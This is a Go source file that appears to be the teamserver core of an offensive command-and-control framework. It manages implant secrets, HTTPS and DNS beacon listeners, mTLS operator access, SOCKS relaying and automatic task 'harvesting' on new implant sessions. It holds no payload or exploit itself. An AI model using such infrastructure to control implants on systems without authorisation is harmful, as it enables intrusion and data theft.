package server

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server/approval"
	"github.com/KKingZero/erebus-exploit-framwork/server/autoharvest"
	"github.com/KKingZero/erebus-exploit-framwork/server/db"
	"github.com/KKingZero/erebus-exploit-framwork/server/listeners"
	"github.com/KKingZero/erebus-exploit-framwork/server/sessions"
	"github.com/KKingZero/erebus-exploit-framwork/server/socks"
	"github.com/KKingZero/erebus-exploit-framwork/server/tasks"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/reflection"
)

type Teamserver struct {
	Config      *Config
	Store       *db.Store
	Sessions    *sessions.Manager
	Dispatcher  *tasks.Dispatcher
	Listeners   *listeners.Manager
	Events      *EventBus
	Approval    *approval.Gate
	AutoHarvest *autoharvest.AutoHarvester
	CA          *zcrypto.CertificateAuthority
	Socks       *socks.Hub

	grpcServer  *grpc.Server
	secret      []byte // legacy fleet PSK
	masterKey   []byte // 32-byte at-rest encryption key
	replayCache *zcrypto.ReplayCache
	done        chan struct{}
}

func NewTeamserver(cfg *Config) (*Teamserver, error) {
	if err := cfg.EnsureDirs(); err != nil {
		return nil, fmt.Errorf("create data dirs: %w", err)
	}

	store, err := db.NewStore(cfg.DBPath)
	if err != nil {
		return nil, fmt.Errorf("init database: %w", err)
	}

	// Load or create CA
	ca, err := loadOrCreateCA(cfg.DataDir)
	if err != nil {
		return nil, fmt.Errorf("init CA: %w", err)
	}

	// Legacy fleet implant secret (optional fallback for unregistered implant IDs)
	var secret []byte
	if cfg.ImplantSecret != "" {
		secret, err = hex.DecodeString(cfg.ImplantSecret)
		if err != nil {
			return nil, fmt.Errorf("decode implant secret: %w", err)
		}
	}

	// Master key for sealing session keys and per-implant secrets at rest
	var masterKey []byte
	if cfg.MasterKey != "" {
		masterKey, err = hex.DecodeString(cfg.MasterKey)
		if err != nil {
			return nil, fmt.Errorf("decode master key: %w", err)
		}
		if len(masterKey) != 32 {
			return nil, fmt.Errorf("master key must be 32 bytes (64 hex chars), got %d", len(masterKey))
		}
	} else {
		masterKey, err = zcrypto.RandomBytes(32)
		if err != nil {
			return nil, fmt.Errorf("generate master key: %w", err)
		}
		cfg.MasterKey = hex.EncodeToString(masterKey)
		log.Printf("[server] generated new master key (caller must save config after NewTeamserver)")
	}

	events := NewEventBus()
	sessMgr := sessions.NewManager(store)
	sessMgr.SetMasterKey(masterKey)
	dispatcher := tasks.NewDispatcher(sessMgr, store, events.Publish)

	approvalGate := approval.NewGate(events.PublishImportant)

	// Configure auto-harvest (opt-in via config)
	ahEnabled := false
	if cfg.AutoHarvest.Enabled != nil {
		ahEnabled = *cfg.AutoHarvest.Enabled
	}
	ahCfg := &autoharvest.AutoHarvestConfig{
		Enabled: ahEnabled,
		Tasks:   cfg.AutoHarvest.Tasks,
	}
	ah := autoharvest.New(ahCfg, dispatcher, store)

	ts := &Teamserver{
		Config:      cfg,
		Store:       store,
		Sessions:    sessMgr,
		Dispatcher:  dispatcher,
		Listeners:   listeners.NewManager(),
		Events:      events,
		Approval:    approvalGate,
		AutoHarvest: ah,
		CA:          ca,
		Socks:       socks.NewHub(),
		secret:      secret,
		masterKey:   masterKey,
		replayCache: zcrypto.NewReplayCache(60 * time.Second),
		done:        make(chan struct{}),
	}

	// Recover sessions from DB (Bug 8)
	if err := sessMgr.RecoverSessions(); err != nil {
		log.Printf("[server] warning: session recovery failed: %v", err)
	}

	return ts, nil
}

// ResolveImplantSecret returns the raw HMAC secret for an implant ID.
// Prefers the sealed per-implant row; falls back to legacy fleet secret.
func (ts *Teamserver) ResolveImplantSecret(implantID string) ([]byte, error) {
	if ts.Store != nil {
		row, err := ts.Store.GetImplant(implantID)
		if err == nil && row != nil && len(row.SecretEnc) > 0 {
			return zcrypto.Open(ts.masterKey, row.SecretEnc)
		}
	}
	if len(ts.secret) > 0 {
		return ts.secret, nil
	}
	return nil, fmt.Errorf("unknown implant %s", implantID)
}

// RegisterImplantSecret seals and stores a per-implant secret after build.
// When upsert is true (admin/manual registration), replaces an existing row.
func (ts *Teamserver) RegisterImplantSecret(implantID, buildID, operator, secretHex string, upsert bool) error {
	if ts.Store == nil {
		return fmt.Errorf("no store configured")
	}
	raw, err := hex.DecodeString(secretHex)
	if err != nil {
		return fmt.Errorf("decode implant secret: %w", err)
	}
	if len(raw) != 32 {
		return fmt.Errorf("implant secret must be 32 bytes, got %d", len(raw))
	}
	sealed, err := zcrypto.Seal(ts.masterKey, raw)
	if err != nil {
		return err
	}
	row := &db.ImplantRow{
		ImplantID: implantID,
		BuildID:   buildID,
		SecretEnc: sealed,
		CreatedAt: time.Now(),
		Operator:  operator,
	}
	if upsert {
		return ts.Store.UpsertImplant(row)
	}
	return ts.Store.CreateImplant(row)
}

func (ts *Teamserver) Start() error {
	// Start gRPC server
	if err := ts.startGRPC(); err != nil {
		return fmt.Errorf("start gRPC: %w", err)
	}

	// Start configured listeners
	for _, lcfg := range ts.Config.Listeners {
		pbCfg := &pb.ListenerConfig{
			Name:     lcfg.Name,
			Protocol: parseProtocol(lcfg.Protocol),
			Host:     lcfg.Host,
			Port:     lcfg.Port,
			Domain:   lcfg.Domain,
		}
		if _, err := ts.CreateListener(pbCfg); err != nil {
			log.Printf("[server] warning: failed to start listener %s: %v", lcfg.Name, err)
		}
	}

	// Start session reaper
	go ts.sessionReaper()

	// Start auto-harvester (subscribes to SESSION_NEW events)
	ahCh, ahUnsub := ts.Events.Subscribe()
	ts.AutoHarvest.Start(ahCh, ahUnsub, ts.Config.Debug)

	log.Printf("[server] teamserver started (gRPC=%s)", ts.Config.GRPCAddr)
	return nil
}

func (ts *Teamserver) CreateListener(cfg *pb.ListenerConfig) (listeners.Listener, error) {
	handler := &listeners.BeaconHandler{
		Sessions:      ts.Sessions,
		Dispatcher:    ts.Dispatcher,
		Secret:        ts.secret,
		ResolveSecret: ts.ResolveImplantSecret,
		Socks:         ts.Socks,
		OnEvent:       ts.Events.Publish,
		ReplayCache:   ts.replayCache,
	}

	switch cfg.Protocol {
	case pb.ListenerProtocol_LISTENER_HTTPS:
		l, err := listeners.NewHTTPSListener(cfg, handler, ts.CA)
		if err != nil {
			return nil, err
		}
		if err := ts.Listeners.Add(l); err != nil {
			return nil, err
		}
		if err := ts.Listeners.Start(l.ID()); err != nil {
			return nil, err
		}
		return l, nil
	case pb.ListenerProtocol_LISTENER_DNS:
		l, err := listeners.NewDNSListener(cfg, handler)
		if err != nil {
			return nil, err
		}
		if err := ts.Listeners.Add(l); err != nil {
			return nil, err
		}
		if err := ts.Listeners.Start(l.ID()); err != nil {
			return nil, err
		}
		return l, nil
	default:
		return nil, fmt.Errorf("unsupported listener protocol: %s", cfg.Protocol)
	}
}

func (ts *Teamserver) startGRPC() error {
	lis, err := net.Listen("tcp", ts.Config.GRPCAddr)
	if err != nil {
		return err
	}

	// Build TLS config for mTLS
	serverCert, _, err := ts.CA.GenerateServerCert([]string{extractHost(ts.Config.GRPCAddr)})
	if err != nil {
		return fmt.Errorf("generate gRPC server cert: %w", err)
	}
	certPool := x509.NewCertPool()
	certPool.AddCert(ts.CA.Cert)
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{serverCert},
		ClientCAs:    certPool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
		MinVersion:   tls.VersionTLS12,
	}

	ts.grpcServer = grpc.NewServer(
		grpc.Creds(credentials.NewTLS(tlsConfig)),
		grpc.UnaryInterceptor(ts.authorizeUnary),
		grpc.StreamInterceptor(ts.authorizeStream),
	)
	pb.RegisterErebusC2Server(ts.grpcServer, NewGRPCService(ts))
	if ts.Config.Debug {
		reflection.Register(ts.grpcServer)
	}

	go func() {
		log.Printf("[grpc] server listening on %s", ts.Config.GRPCAddr)
		if err := ts.grpcServer.Serve(lis); err != nil {
			log.Printf("[grpc] serve error: %v", err)
		}
	}()

	return nil
}

func (ts *Teamserver) Stop() {
	log.Println("[server] shutting down...")
	close(ts.done)
	if ts.AutoHarvest != nil {
		ts.AutoHarvest.Stop()
	}
	ts.Listeners.StopAll()
	if ts.grpcServer != nil {
		ts.grpcServer.GracefulStop()
	}
	if ts.Store != nil {
		ts.Store.Close()
	}
}

func (ts *Teamserver) sessionReaper() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			ts.Sessions.Reaper(5 * time.Minute)
		case <-ts.done:
			return
		}
	}
}

func loadOrCreateCA(dataDir string) (*zcrypto.CertificateAuthority, error) {
	certPath := filepath.Join(dataDir, "ca-cert.pem")
	keyPath := filepath.Join(dataDir, "ca-key.pem")

	if _, err := os.Stat(certPath); err == nil {
		return zcrypto.LoadCA(certPath, keyPath)
	}

	ca, err := zcrypto.NewCA("Erebus", 10)
	if err != nil {
		return nil, err
	}

	if err := zcrypto.SavePEM(certPath, ca.CertPEM); err != nil {
		return nil, err
	}
	if err := zcrypto.SavePEM(keyPath, ca.KeyPEM); err != nil {
		return nil, err
	}

	log.Printf("[server] generated new CA: %s", certPath)
	return ca, nil
}

func extractHost(addr string) string {
	host := addr
	if h, _, err := net.SplitHostPort(addr); err == nil {
		host = h
	}
	if host == "" || host == "0.0.0.0" {
		host = "127.0.0.1"
	}
	// Strip brackets from IPv6
	host = strings.TrimPrefix(host, "[")
	host = strings.TrimSuffix(host, "]")
	return host
}

func parseProtocol(s string) pb.ListenerProtocol {
	switch s {
	case "https":
		return pb.ListenerProtocol_LISTENER_HTTPS
	case "mtls":
		return pb.ListenerProtocol_LISTENER_MTLS
	case "dns":
		return pb.ListenerProtocol_LISTENER_DNS
	default:
		return pb.ListenerProtocol_LISTENER_HTTPS
	}
}
